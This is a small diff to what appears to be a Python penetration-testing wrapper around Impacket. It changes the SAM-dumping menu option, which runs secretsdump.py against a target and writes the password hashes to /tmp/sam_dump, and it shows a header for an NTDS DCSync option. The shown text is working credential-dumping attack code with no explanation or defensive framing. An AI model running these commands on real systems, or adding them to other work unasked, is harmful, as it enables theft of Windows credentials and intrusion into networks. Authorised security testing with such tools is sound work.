@@ -42,7 +42,7 @@ def run():
 
     # ── [1] SAM ───────────────────────────────────────────────────────────────
     if c == "1":
-        run_cmd(f"{imp('secretsdump.py')} {base} -sam -system -outputfile /tmp/sam_dump")
+        run_cmd(f"{imp('secretsdump.py')} {base} -outputfile /tmp/sam_dump")
         success("SAM hashes → /tmp/sam_dump.sam")
 
     # ── [2] NTDS DCSync ───────────────────────────────────────────────────────
